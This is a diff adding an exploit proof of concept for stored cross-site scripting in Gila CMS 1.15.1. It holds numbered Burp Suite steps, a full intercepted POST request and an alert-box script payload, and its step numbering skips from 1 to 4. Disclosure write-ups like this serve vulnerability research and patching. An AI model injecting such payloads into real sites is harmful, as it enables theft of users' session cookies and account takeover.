@@ -1,0 +1,84 @@
+# Exploit Title: Gila CMS <= 1.15.1 - stored Cross-Site Scripting
+# 
+# Date: 2020-08-05
+# Exploit Author: Hao Wang
+# Contact: haowang93104@gmail.com
+# Vendor Homepage: http://gilacms.com/
+# Software Link: https://github.com/GilaCMS/gila
+# Version: v1.15.1
+# Category: Webapps
+# Tested on: XAMPP for Windows
+# Software Description : Gila CMS is a lightweight and fast CMS system built with PHP
+# Description : Exploiting these issues could allow an attacker to steal cookie-based authentication credentials,
+# compromise the application, access or modify data.
+# Gila CMS 1.15.1 is vulnerable; prior versions may also be affected.
+# ==================================================================
+
+# PoC:
+
+#1. Login in as admin or a common member who have the permission to create new posts.
+#4. Click "Posts" on the sidebar, and then click "New" to create a new post.
+#5. Enter the title and post body, and turn on the "public" option.
+#6. Turn on Burpsuite's "Intercept" function before sending the "create" request.
+#7. Click the "Create" button, the request is intercepted by burpsuite, then insert "<script>alert("xss");</script>" in the post body before forwarding this request.
+
+### Burp request ###
+POST /gila/cm/update_rows/post HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------212203167529489612763960840498
+Content-Length: 1133
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/gila/admin/content/post
+Cookie: flash=no; GSESSIONID=1rp3jgt84n9tfu8bxdwwrol83rpwwlmpxieg7d0orgrhvjceia; PHPSESSID=hhcflmct0tfiv3c1c32ltt8n3h
+
+-----------------------------212203167529489612763960840498
+Content-Disposition: form-data; name="formToken"
+
+1eojfrsfnnu0xr6
+-----------------------------212203167529489612763960840498
+Content-Disposition: form-data; name="thumbnail"
+
+
+-----------------------------212203167529489612763960840498
+Content-Disposition: form-data; name="title"
+
+xx
+-----------------------------212203167529489612763960840498
+Content-Disposition: form-data; name="slug"
+
+
+-----------------------------212203167529489612763960840498
+Content-Disposition: form-data; name="description"
+
+
+-----------------------------212203167529489612763960840498
+Content-Disposition: form-data; name="user_id"
+
+2
+-----------------------------212203167529489612763960840498
+Content-Disposition: form-data; name="tags"
+
+
+-----------------------------212203167529489612763960840498
+Content-Disposition: form-data; name="publish"
+
+1
+-----------------------------212203167529489612763960840498
+Content-Disposition: form-data; name="post"
+
+<p><script>alert("xss");</script></p>
+-----------------------------212203167529489612763960840498--
+
+
+### payload ###
+<script>alert("xss");</script>
+
+
+# 8. Open the new created post, you should see an alert.
+
+# Similar vulnerabilities also appear when creating new pages.
